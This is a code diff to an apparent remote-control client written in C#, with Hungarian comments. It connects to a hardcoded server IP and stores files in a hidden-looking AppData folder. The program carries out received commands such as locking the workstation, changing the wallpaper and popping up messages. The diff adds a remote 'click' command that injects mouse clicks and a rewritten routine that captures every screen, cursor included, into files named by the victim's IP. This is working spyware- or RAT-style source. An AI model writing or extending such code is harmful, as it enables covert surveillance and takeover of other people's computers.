@@ -19,6 +19,10 @@ namespace nclient
 {
     internal class Program
     {
+        [DllImport("user32.dll")]
+        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, UIntPtr dwExtraInfo);
+        const uint LEFTDOWN = 0x02;
+        const uint LEFTUP = 0x04;
         [DllImport("user32")]
         public static extern void LockWorkStation();
 
@@ -89,16 +93,12 @@ namespace nclient
 
 
 
-
         public static void SetWallpaper(string path)
         {
             // Beállítja az új háttérképet
             SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path,
                 SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
         }
-
-
-
         //megcsinálja a directorykat
         public static string appdataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
         public static string workPath = appdataPath + "\\negnox";
@@ -273,6 +273,7 @@ public static string serverIP = "192.168.9.105";
                                     File.WriteAllText(dataPath + "\\emesgebox.vbs", $"msgbox \"{text}\"");
                                     Process.Start(dataPath + "\\emesgebox.vbs");
                                     Console.WriteLine("emesgebox elinditvaxd");*/
+
                                     _= Task.Run(() =>
                                     {
                                         MessageBox.Show(
@@ -737,6 +738,12 @@ public static string serverIP = "192.168.9.105";
                                     Environment.Exit(0);
                                     break;
 
+                                case "click":
+                                    command = "";
+                                    mouse_event(LEFTDOWN, 0, 0, 0, UIntPtr.Zero);
+                                    mouse_event(LEFTUP, 0, 0, 0, UIntPtr.Zero);
+                                    break;
+
 
                                 case "file|":
                                     Console.WriteLine("ezt jo tudni hogy jo minden, bejott a file-ba");
@@ -1015,7 +1022,7 @@ public static string serverIP = "192.168.9.105";
 
 
 
-
+        /*
         private static void TakeScreenshot()
         {
             string timestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
@@ -1055,6 +1062,47 @@ public static string serverIP = "192.168.9.105";
                 Console.WriteLine("Összefűzött screenshot mentve: " + $"{dataPath}\\{fileName}");
                
 
+            }
+        }*/
+        private static void TakeScreenshot()
+        {
+            string timestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
+
+            int minX = Screen.AllScreens.Min(s => s.Bounds.X);
+            int minY = Screen.AllScreens.Min(s => s.Bounds.Y);
+            int maxX = Screen.AllScreens.Max(s => s.Bounds.Right);
+            int maxY = Screen.AllScreens.Max(s => s.Bounds.Bottom);
+
+            int width = maxX - minX;
+            int height = maxY - minY;
+
+            using (Bitmap fullBmp = new Bitmap(width, height))
+            using (Graphics g = Graphics.FromImage(fullBmp))
+            {
+                g.Clear(Color.Black);
+
+                foreach (var screen in Screen.AllScreens)
+                {
+                    Rectangle bounds = screen.Bounds;
+
+                    g.CopyFromScreen(
+                        sourceX: bounds.X,
+                        sourceY: bounds.Y,
+                        destinationX: bounds.X - minX,
+                        destinationY: bounds.Y - minY,
+                        blockRegionSize: bounds.Size
+                    );
+                }
+
+                // Egér pozíció lekérése
+                Point cursorPos = Cursor.Position;
+                // Egér ikon lekérése
+                Cursor.Current.Draw(g, new Rectangle(cursorPos.X - minX, cursorPos.Y - minY, Cursor.Current.Size.Width, Cursor.Current.Size.Height));
+
+                string fileName = $"{localIP}_screenshot_" + timestamp + "_.png";
+                fullBmp.Save($"{dataPath}\\{fileName}", System.Drawing.Imaging.ImageFormat.Png);
+                screenshotPath = $"{dataPath}\\{fileName}";
+                Console.WriteLine("Összefűzött screenshot mentve: " + $"{dataPath}\\{fileName}");
             }
         }
 
